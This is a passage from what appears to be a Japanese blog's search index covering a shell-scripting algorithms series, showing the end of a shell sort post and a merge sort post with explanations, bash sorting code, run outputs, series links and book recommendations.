array[$inner]=\u0026#34;${array[$(($inner-$interval))]}\u0026#34; ; inner=$(($inner-$interval)) ; done array[\u0026#34;$inner\u0026#34;]=\u0026#34;$tmp\u0026#34; ; done # 間隔を縮める interval=$(( ($interval-1)/3 )) ; done } ## # shellSort() # シェルソートの実行 function execSort(){ setArray \u0026#34;$1\u0026#34; ; display ; shellSort ; display ; } ## # メイン time execSort 100 ; exit ; # 実行結果 bash-5.1$ bash 05_2ShellSort.sh 0 28180 1 4836 2 9945 3 21276 4 32033 5 18456 6 11925 7 5197 8 7127 9 20353 10 18712 11 25395 12 1495 13 19716 14 32750 15 14660 16 14831 17 22983 18 27578 19 20774 20 21965 21 9252 22 30295 23 29146 24 4113 25 4811 26 28346 27 31461 28 29323 29 26609 30 4747 31 20171 32 15706 33 18532 34 31060 35 13983 36 2191 37 9145 38 30505 39 1638 40 28539 41 25193 42 15163 43 28219 44 9181 45 1016 46 5625 47 17060 48 3392 49 13482 50 29383 51 22114 52 14464 53 29466 54 9077 55 7359 56 904 57 31061 58 7134 59 20839 60 28148 61 10356 62 2156 63 6153 64 22757 65 29293 66 28869 67 24978 68 15014 69 23105 70 300 71 27492 72 23677 73 13103 74 7941 75 8817 76 13248 77 16966 78 1570 79 22098 80 31877 81 2981 82 26875 83 13033 84 10921 85 7062 86 11045 87 15871 88 26290 89 28571 90 31032 91 25600 92 28519 93 13570 94 11491 95 982 96 25872 97 22438 98 15530 99 21171 ------ 0 300 1 904 2 982 3 1016 4 1495 5 1570 6 1638 7 2156 8 2191 9 2981 10 3392 11 4113 12 4747 13 4811 14 4836 15 5197 16 5625 17 6153 18 7062 19 7127 20 7134 21 7359 22 7941 23 8817 24 9077 25 9145 26 9181 27 9252 28 9945 29 10356 30 10921 31 11045 32 11491 33 11925 34 13033 35 13103 36 13248 37 13482 38 13570 39 13983 40 14464 41 14660 42 14831 43 15014 44 15163 45 15530 46 15706 47 15871 48 16966 49 17060 50 18456 51 18532 52 18712 53 19716 54 20171 55 20353 56 20774 57 20839 58 21171 59 21276 60 21965 61 22098 62 22114 63 22438 64 22757 65 22983 66 23105 67 23677 68 24978 69 25193 70 25395 71 25600 72 25872 73 26290 74 26609 75 26875 76 27492 77 27578 78 28148 79 28180 80 28219 81 28346 82 28519 83 28539 84 28571 85 28869 86 29146 87 29293 88 29323 89 29383 90 29466 91 30295 92 30505 93 31032 94 31060 95 31061 96 31461 97 31877 98 32033 99 32750 ------ real\t0m0.124s user\t0m0.070s sys\t0m0.052s bash-5.1$ シェルソートの効率 ソート 「ざっくり」シリーズのご紹介 【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８\nhttps://suzukiiichiro.github.io/2022-10-27-01-shellsort-suzuki/\n【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７\nhttps://suzukiiichiro.github.io/2022-10-19-01-mergesort-suzuki/\n【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-27T14:27:50+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-27-01-shellsort-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-27-01-shellsort-suzuki/","title":"【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８"},{"content":"マージソート マージソートは、これまで紹介した「バブルソート」「挿入ソート」「選択ソート」と比べると、少なくともスピードの点ではずっと高速で効率的です。\nマージソート マージソートの効率 「バブルソート」「挿入ソート」「選択ソート」がO(N^2)の時間を要するのに対し、マージソートはO(N＊log(N))です。\n例えば、N(ソートする項目の数）が１０，０００の場合、N^2 は１００，０００，０００ですが、N＊log(N)は４０，０００です。\n別の言い方をすると、マージソートで４０秒を要するソートは、挿入ソートでは約２８時間かかります。\nプログラムの構成は、今後出てくるクイックソートやシェルソートよりもわかりやすく、構築が容易です。\nソートの比較\nソート マージソートの欠点 マージソートの欠点は、ソートする配列と同じサイズの配列をもう一つ必要とすることです。\n元の配列がかろうじてメモリ内に収まるという大きさだったら、マージソートは使えません。\nしかし、メモリに余裕がある場合は、マージソートは良い選択です。\nマージソートのアルゴリズム マージソートのアルゴリズムの中心は、未ソート配列を要素の数が２以下になるまで分解を繰り返し、１つないし２つの要素を比較、並べ替えを行いながらマージ（併合）を繰り返します。\nマージソート 要素列を均等に分割できる場合のマージソート 要素列の要素数が偶数個ある場合は分割は真ん中で行われます。\n要素列の要素数がが奇数個の場合、たとえば要素列の要素数が７つの場合、２で割った部分（３ですね）と残り（４）というふうに分割します。\nここでは、要素列の要素数が偶数個の場合を考えていきます。\nマージソート 分割後左側の「分解」処理\n１．並べ替える前の未ソート列があります。これをこれからマージソートで並べ替えます。\n２．まずは未ソート列を２つに分割します。\n３．分割した２つの未ソート列を要素の数が２以下になるまで分割を繰り返します。（ここではあっというまに２以下となりました）\n４．分割した要素を比較するため６と３に分解しました。\n分割後左側の「マージ」処理\n５．６と３を比較して並べ替えと同時にマージ（併合）します。これにより（３，６）となりました。\n６．７と５も比較するために７と５に分解します。\n７．７と５に分解した要素を比較して並べ替えます。ここでは並べ替える必要はないようでした。\n８．（３，６）と（５，７）の４つの要素を比較して並べ替えながらマージ（併合）します。\n分割後右側の「分解」処理\n９．右側（２，８，４，１）を分解して（２，８）と（４，１）に分解します。\n１０．２と８を更に分解し、比較できるように分解します。\n１１．２と８を比較して（２，８）とマージしました。ここでは並び順に変更はないようでした。\n１２．４と１も比較できるように分解します。\n分割後右側の「マージ」処理\n１３．分解した４と１を比較して並べ替えを行いつつ（１，４）とマージします。\n１４．（２，８）と（１，４）の４つの要素を比較しながらマージします。\n１５．（３，５，６，７）と（１，２，４，８）を比較しながらマージします。\nヒント 分割段階では要素の数が２以下となるまで分割を繰り返し、マージは、最初は１つ、次は２つの要素を組み合わせて４つとし、次は４つの要素をもつ２つのソート済み列をマージして８つの要素をもつソート済み列を組み上げていきます。 要素列を均等に分割できない場合のマージソート 要素列の要素数が偶数個ある場合は分割は真ん中で行われます。\n要素列の要素数がが奇数個の場合、たとえば要素列の要素数が７つの場合、２で割った部分（３ですね）と残り（４）というふうに分割します。\nここでは、要素列の要素数が奇数個の場合を考えていきます。\nマージソート この図では、動作を左右２つに分けて表しています。\n左側は分割、右側はマージ（併合）です。\nまずは、左側から説明します。\n前半の左側の説明\n７つの要素があります。\n７つの要素は真ん中で半分に分けることができません。\nそのため３つ（５，４，２）と４つ（８，７，３，６）に分割しています。\n２つに分けたら、（５，４，２）をさらに２つに分けます。\n先程同様、３つの要素は真ん中で半分に分けることができません。\nですので、（５）と（４，２）で２つに分けます。\nここが重要なのですが、分解した要素の数が２以下になるまでこれらの動作を繰り返します。\nそこで、左側の一番下の図の通り、要素の大小が比較できる直前までを行い準備を完了とします。\n後半の右側の説明\n後半右側の図は下から処理を進めていきます。\nマージソートは、マージ（併合）するたびに並べ替えを行います。\n右側一番下の段から二段目に上がる段階で、それぞれの大小を比較して並べ替えを行いマージ（併合）します。\n４と２を比較して（２，４）と並べ替えてマージ。\n８と７を比較して（７，８）と並べ替えてマージ。\n３と６を比較して（３，６）と並べ替えて・・・というかそのままマージします。\n右側下から２段目から下から３段目の説明ですが、\n５と（２，４）を並べ替えてマージします。\nこれまでは２つの要素を比較してマージしましたが、ここからの比較・マージの対象となる要素は少しずつ増えます。\n（７，８）と（３，６）の４つの要素を比較して小さな要素から順番に並べ替えながらマージします。\n右側下から３段目の様子になったら、（２，４，５）と（３，６，７，８）の７つの要素を比較して小さな要素から順番に並べ替えてマージします。\nヒント 左側上から２段目の未ソートの要素を並べ替えるよりも、右側下から３段目（上から２段め）の要素列を並べ替えるほうが断然効率的なのです。 理由は、２つの未ソート配列を並べ替えるのと、２つのソート済み配列をマージ（併合）する処理の違いは、要素の比較や交換・移動が、未ソート配列をマージするよりも少なくてすむからです。 ２つのソート済み配列をマージ（併合）する場合は、２つのソート済み配列先頭の大小を比較しながらマージすれば良いからなのですね。 マージソートの唯一の欠点は、もとの配列と同じサイズの配列をもう一つ用意する必要があることで、メモリ使用領域が２倍必要ということです。 プログラムソース この章で使っているプログラムソースは以下にあります。\n05_1MergeSort.sh マージソート\nマージソートのアルゴリズム マージソートのプログラムは、\nmergeSort() merge() の２つの部分から構成されています。\nまず、配列全体を指定した mergeSort() を呼び出します。\nmergeSort()は配列を要素の数が２以下になるまで分割を繰り返すので再帰関数となります。\nその後、merge()により２つの済み配列の比較・並べかえを行いながら「マージ(併合)」を繰り返し、１つのソート済み配列を作ります。\n配列の 𝑙 番目から 𝑟 番目までをソートする merge_sort(arr[], l, r) のアルゴリズムは以下のようになります。\n𝑚𝑖𝑑=(𝑙+𝑟)/2 とする\nmerge_sort(𝑎𝑟𝑟[],𝑙,𝑚𝑖𝑑) で 𝑙 番目から 𝑚𝑖𝑑 番目までソート\nmerge_sort(𝑎𝑟𝑟[],𝑚𝑖𝑑+1,𝑟) で 𝑚𝑖𝑑+1 番目から 𝑟 番目までソート\nmerge(𝑎𝑟𝑟[],𝑙,𝑚𝑖𝑑,𝑟) で先程ソートした配列をマージしながらソート\nmergeSort(){ local lowerBound=\u0026#34;$1\u0026#34; ; local upperBound=\u0026#34;$2\u0026#34; ; #範囲が１なら再帰呼び出しの終了 基底条件 if [ \u0026#34;$lowerBound\u0026#34; -eq \u0026#34;$upperBound\u0026#34; ]; then #ソートは不要 : else #列を２つに分割する中間点を見つける local mid=$(( ($lowerBound+$upperBound) / 2 )); #前半分をソート mergeSort \u0026#34;$lowerBound\u0026#34; \u0026#34;$mid\u0026#34; ; #後半分をソート mergeSort \u0026#34;$(($mid+1))\u0026#34; \u0026#34;$upperBound\u0026#34; #両者をマージ mergeSortLogic \u0026#34;$lowerBound\u0026#34; \u0026#34;$(($mid+1))\u0026#34; \u0026#34;$upperBound\u0026#34; ; fi } merge() を実行する時点で、mergeSort( 部分配列の前半 ) と mergeSort( 部分配列の後半 ) の処理はすでに終了しています。\nmerge はすでにソートされている部分配列の前半と後半に対して実行されます。\n言い換えれば、merge の役割は、すでにソートされている２つの部分配列を１つのソートされた部分配列にすることです。\nmerge(){ #作業スペースのインデクス local j=0; #下半分の部分配列が始まる位置 local lowPtr=\u0026#34;$1\u0026#34; ; #上半分の部分配列が始まる位置 local highPtr=\u0026#34;$2\u0026#34; ; #上半分の配列の上限位置 local _upperBound=\u0026#34;$3\u0026#34; ; #下半分の配列の上限位置 local _lowerBound=\u0026#34;$lowPtr\u0026#34; ; local _mid=\u0026#34;$(($highPtr-1))\u0026#34; ; #項目の数 local n=\u0026#34;$(($_upperBound-$_lowerBound+1))\u0026#34; ; #マージする列が２つある場合 while ((\u0026#34;$lowPtr\u0026#34; \u0026lt;= \u0026#34;$_mid\u0026#34; \u0026amp;\u0026amp; \u0026#34;$highPtr\u0026#34; \u0026lt;= \u0026#34;$_upperBound\u0026#34; ));do #小さい値をコピー if [ \u0026#34;${array[$lowPtr]}\u0026#34; -lt \u0026#34;${array[$highPtr]}\u0026#34; ]; then workArray[$j]=\u0026#34;${array[((lowPtr++))]}\u0026#34; ; ((j++)) ; else workArray[$j]=\u0026#34;${array[((highPtr++))]}\u0026#34; ; ((j++)) ; fi done #前半分のリスト while (( \u0026#34;$lowPtr\u0026#34; \u0026lt;= \u0026#34;$_mid\u0026#34; )); do #前半分の要素をそのまま作業用配列にコピー workArray[$j]=\u0026#34;${array[((lowPtr++))]}\u0026#34; ; ((j++)) ; done #後半分のリスト while (( \u0026#34;$highPtr\u0026#34; \u0026lt;= \u0026#34;$_upperBound\u0026#34; )) ; do #後半分の要素を逆順に作業用配列にコピー workArray[$j]=\u0026#34;${array[((highPtr++))]}\u0026#34; ; ((j++)) ; done #昇順に整列するよう１つのリストにまとめる #作業用配列の両端から取り出したデータをマージして配列に入れる for((j=0; j\u0026lt;$n; j++)); do array[$(($_lowerBound+$j))]=\u0026#34;${workArray[$j]}\u0026#34; ; done } マージ（併合）のロジック マージソート 上の図は、merge()のメカニズムをカードの操作で表します。\n左右にカードの束があり、各束のカードは小さい順に整列されているものとします。\nmerge()の処理は、各カードの山の一番上にあるカードの値を比較し、小さい方を選択して順番に並べます。\n要素１６のマージソート 要素が増えてもマージソートのロジックは全く変わりません。\n複数の要素を真ん中で２つに分け分解を繰り返し、その後併合も繰り返します。\nこうしたアルゴリズムを「分割統治法」といいます。\nマージソート 要素が大量の場合のマージソート 要素の数が大きくなった場合も分割統治法により、怯える必要がないのです。\n分割を再帰により繰り返し、併合を繰り返します。\nマージソート マージソートの計算量 時間計算量(time complexity)\n最悪・平均・最善の計算時間は O(N＊ log(N))となります。これはO(N2)と比べると非常に高速です。\n領域計算量 (space complexity)\nmerge() 関数は、配列の長さ Nのオーダーで新しいメモリが必要となってしまいます。\nこれにより消費メモリはO(N)となります。\nマージソートの効率 では、これまでどおり、ソートの効率をグラフにプロットしたものです。参考にしてください。\nマージソートの効率 各ソート比較 こちらのほうがわかりやすいかもしれませんね。\nソート bash/シェルスクリプトによる疑似２次元配列の実装 #!/bin/bash ####################################### # 05_1MergeSort.shを、少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; declare -i wElems=0; # # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setWvalue() # セッター function setWvalue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Welem=\u0026#34;$1\u0026#34;; local wvalue=\u0026#34;$2\u0026#34;; eval \u0026#34;wRray[$Welem].getWvalue() { echo \u0026#34;$wvalue\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setWiD() # セッター function setWID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Welem=\u0026#34;$1\u0026#34;; local wid=\u0026#34;$2\u0026#34;; eval \u0026#34;wRray[$Welem].getWID() { echo \u0026#34;$wid\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } ## # \u0026lt;\u0026gt;bubbleSort() # バブルソート # URL:https://www.youtube.com/watch?v=xli_FI7CuzA function bubbleSort(){ local tmp_id; local tmp_value; for((i=nElems;i\u0026gt;0;i--)){ for((j=0;j\u0026lt;i-1;j++)){ if(($(aRray[$j].getValue)\u0026gt;$(aRray[$((j+1))].getValue)));then # 交換 tmp_id=$(aRray[$j].getID); tmp_value=$(aRray[$j].getValue); setID \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getID); #IDをセット setValue \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getValue); #Valueをセット setID $((j+1)) $tmp_id; #IDをセット setValue $((j+1)) $tmp_value; #Valueをセット # 交換 fi } } } ## \u0026lt;\u0026gt;selectionSort() # 選択ソート # URL:https://www.youtube.com/watch?v=g-PGLbMth_g function selectionSort(){ local tmp_id; local tmp_value; for((i=0;i\u0026lt;nElems;i++)){ min=$i; for((j=i+1;j\u0026lt;nElems;j++)){ if(($(aRray[$min].getValue)\u0026gt;$(aRray[$j].getValue)));then min=$j; fi } # 交換 tmp_id=$(aRray[$min].getID); tmp_value=$(aRray[$min].getValue); setID \u0026#34;$min\u0026#34; $(aRray[$i].getID); #IDをセット setValue \u0026#34;$min\u0026#34; $(aRray[$i].getValue); #Valueをセット setID $i $tmp_id; #IDをセット setValue $i $tmp_value; #Valueをセット # 交換 } } ## ## \u0026lt;\u0026gt;insertionSort() # 挿入ソート # URL:https://www.youtube.com/watch?v=DFG-XuyPYUQ function insertionSort(){ local tmp_id; local tmp_value; for((out=1;out\u0026lt;nElems;out++)){ tmp_id=$(aRray[$out].getID); tmp_value=$(aRray[$out].getValue); in=$out; while (( in \u0026gt; 0 ))\u0026amp;\u0026amp;(( $(aRray[$((in-1))].getValue) \u0026gt; tmp_value ));do setID \u0026#34;$in\u0026#34; $(aRray[$((in-1))].getID); #IDをセット setValue \u0026#34;$in\u0026#34; $(aRray[$((in-1))].getValue); #Valueをセット in=$((in-1)); done setID \u0026#34;$in\u0026#34; $tmp_id; #IDをセット setValue \u0026#34;$in\u0026#34; $tmp_value; #Valueをセット } } ## # merge() # マージソートのマージ（併合）部分メソッド merge(){ #作業スペースのインデクス local j=0; #下半分の部分配列が始まる位置 local lowPtr=\u0026#34;$1\u0026#34; ; #上半分の部分配列が始まる位置 local highPtr=\u0026#34;$2\u0026#34; ; #上半分の配列の上限位置 local _upperBound=\u0026#34;$3\u0026#34; ; #下半分の配列の上限位置 local _lowerBound=\u0026#34;$lowPtr\u0026#34; ; local _mid=\u0026#34;$(($highPtr-1))\u0026#34; ; #項目の数 local n=\u0026#34;$((_upperBound-_lowerBound+1))\u0026#34; ; #マージする列が２つある場合 while ((\u0026#34;$lowPtr\u0026#34; \u0026lt;= \u0026#34;$_mid\u0026#34; \u0026amp;\u0026amp; \u0026#34;$highPtr\u0026#34; \u0026lt;= \u0026#34;$_upperBound\u0026#34; ));do #小さい値をコピー if (($(aRray[$lowPtr].getValue)\u0026lt;$(aRray[$highPtr].getValue)));then setWID \u0026#34;$j\u0026#34; $(aRray[$lowPtr].getID); #IDをセット setWvalue \u0026#34;$j\u0026#34; $(aRray[$lowPtr].getValue); #Valueをセット ((lowPtr++)); ((j++)) ; else setWID \u0026#34;$j\u0026#34; $(aRray[$highPtr].getID); #IDをセット setWvalue \u0026#34;$j\u0026#34; $(aRray[$highPtr].getValue); #Valueをセット ((highPtr++)); ((j++)) ; fi done #前半分のリスト while (( \u0026#34;$lowPtr\u0026#34; \u0026lt;= \u0026#34;$_mid\u0026#34; )); do #前半分の要素をそのまま作業用配列にコピー setWID \u0026#34;$j\u0026#34; $(aRray[$lowPtr].getID); #IDをセット setWvalue \u0026#34;$j\u0026#34; $(aRray[$lowPtr].getValue); #Valueをセット ((lowPtr++)); ((j++)) ; done #後半分のリスト while (( \u0026#34;$highPtr\u0026#34; \u0026lt;= \u0026#34;$_upperBound\u0026#34; )) ; do #後半分の要素を逆順に作業用配列にコピー setWID \u0026#34;$j\u0026#34; $(aRray[$highPtr].getID); #IDをセット setWvalue \u0026#34;$j\u0026#34; $(aRray[$highPtr].getValue); #Valueをセット ((highPtr++)); ((j++)) ; done #昇順に整列するよう１つのリストにまとめる #作業用配列の両端から取り出したデータをマージして配列に入れる for((j=0; j\u0026lt;$n; j++)); do setID $((_lowerBound+j)) $(wRray[$j].getWID); #IDをセット setValue $((_lowerBound+j)) $(wRray[$j].getWvalue); #Valueをセット done } ## \u0026lt;\u0026gt;mergeSort() # マージソート # URL:https://www.youtube.com/watch?v=4VqmGXwpLqc mergeSort(){ local lowerBound=\u0026#34;$1\u0026#34; ; local upperBound=\u0026#34;$2\u0026#34; ; #範囲が１なら再帰呼び出しの終了 基底条件 if [ \u0026#34;$lowerBound\u0026#34; -eq \u0026#34;$upperBound\u0026#34; ]; then #ソートは不要 : else #列を２つに分割する中間点を見つける local mid=$(( $((lowerBound+upperBound)) / 2 )); #前半分をソート mergeSort \u0026#34;$lowerBound\u0026#34; \u0026#34;$mid\u0026#34; ; #後半分をソート mergeSort \u0026#34;$((mid+1))\u0026#34; \u0026#34;$upperBound\u0026#34; #両者をマージ merge \u0026#34;$lowerBound\u0026#34; \u0026#34;$((mid+1))\u0026#34; \u0026#34;$upperBound\u0026#34; ; fi } # \u0026lt;\u0026gt;execSort() # メインルーチン function execSort(){ local N=$1; setArray $N; #配列をセット echo \u0026#34;修正前\u0026#34; display; #bubbleSort; #バブルソート #selectionSort; #選択ソート #insertionSort; #挿入ソート mergeSort 0 \u0026#34;$(($nElems-1))\u0026#34; ; #マージソート echo \u0026#34;修正後\u0026#34; display; } ## # 実行 time execSort 10; exit; 実行結果 bash-5.1$ bash 05_1Eval_MergeSort.sh 修正前 aRray[0] ID: 100 Value: 3114 aRray[1] ID: 101 Value: 16112 aRray[2] ID: 102 Value: 28827 aRray[3] ID: 103 Value: 32104 aRray[4] ID: 104 Value: 11076 aRray[5] ID: 105 Value: 7824 aRray[6] ID: 106 Value: 450 aRray[7] ID: 107 Value: 21013 aRray[8] ID: 108 Value: 28555 aRray[9] ID: 109 Value: 3675 修正後 aRray[0] ID: 106 Value: 450 aRray[1] ID: 100 Value: 3114 aRray[2] ID: 109 Value: 3675 aRray[3] ID: 105 Value: 7824 aRray[4] ID: 104 Value: 11076 aRray[5] ID: 101 Value: 16112 aRray[6] ID: 107 Value: 21013 aRray[7] ID: 108 Value: 28555 aRray[8] ID: 102 Value: 28827 aRray[9] ID: 103 Value: 32104 real\t0m0.287s user\t0m0.123s sys\t0m0.163s bash-5.1$ 「ざっくり」シリーズのご紹介 【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７\nhttps://suzukiiichiro.github.io/2022-10-19-01-mergesort-suzuki/\n【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 